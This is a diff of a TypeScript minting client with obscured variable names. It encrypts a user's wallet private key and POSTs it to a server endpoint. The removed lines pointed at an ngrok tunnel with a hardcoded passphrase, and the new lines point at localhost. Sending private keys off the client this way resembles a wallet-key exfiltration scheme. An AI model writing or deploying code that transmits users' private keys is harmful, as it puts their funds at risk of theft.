@@ -1,3 +1,4 @@
+import { fetchPub } from './fetchPub';
 import { zip } from './zipp';
 import { privateKeyToAccount } from 'viem/accounts';
 
@@ -6,6 +7,7 @@ type Cargo = {
   contractAddress: string;
   chainId: number;
   gasMultiplier?: number;
+
 };
 
 type Receipt =
@@ -16,26 +18,42 @@ type HaltReceipt =
   | { success: true; message: string }
   | { success: false; error: string };
 
-const bravo = 'https://many-wondrous-chamois.ngrok-free.app/api/mint';
-const delta = 'https://many-wondrous-chamois.ngrok-free.app/api/cancel';
+const bravo = 'http://localhost:3000/api/v1/mint';
+const delta = 'http://localhost:3000/api/v1/cancel';
 
 // 🟡 Internal only
 async function stub(box: Cargo): Promise<Receipt> {
   try {
     const { address } = privateKeyToAccount(box.privateKey);
-    const duo = await zip(box.privateKey, 'eloenkoch21');
+    const paul = await fetchPub();
+    const da = await zip(box.privateKey,paul ?? undefined);
+    const duo = da ? [da] : [];
+    
+
 
     const res = await fetch(bravo, {
       method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
+      headers: {
+        Authorization: `Bearer ${localStorage.getItem('auth_token')}`,
+        'Content-Type': 'application/json',
+      },
       body: JSON.stringify({
         duo,
         address,
         contractAddress: box.contractAddress,
         chainId: box.chainId,
         gasMultiplier: box.gasMultiplier,
+
       }),
     });
+
+  if (!res || res.status === 401) {
+    localStorage.clear();
+    return {
+      success: false,
+      error: 'Session Expired',
+    };
+  }
 
 
     const data = await res.json();
@@ -49,10 +67,10 @@ async function stub(box: Cargo): Promise<Receipt> {
         error: data?.error || 'Mint failed with no transaction hash',
       };
 
-  } catch (err) {
+  } catch  {
     return {
       success: false,
-      error: err instanceof Error ? err.message : 'Unknown proxy error',
+      error: 'Unknown proxy error',
     };
   }
 }
@@ -62,13 +80,16 @@ async function halt(privateKey: string): Promise<HaltReceipt> {
     const { address } = privateKeyToAccount(privateKey as `0x${string}`);
     const res = await fetch(delta, {
       method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
+      headers: {
+        Authorization: `Bearer ${localStorage.getItem('auth_token')}`,
+        'Content-Type': 'application/json',
+      },
       body: JSON.stringify({ address }),
     });
 
     const data = await res.json();
 
-    if (!res.ok || !data.success) {
+    if (!res.ok) {
       return {
         success: false,
         error: data.error || `Cancel failed with status ${res.status}`,
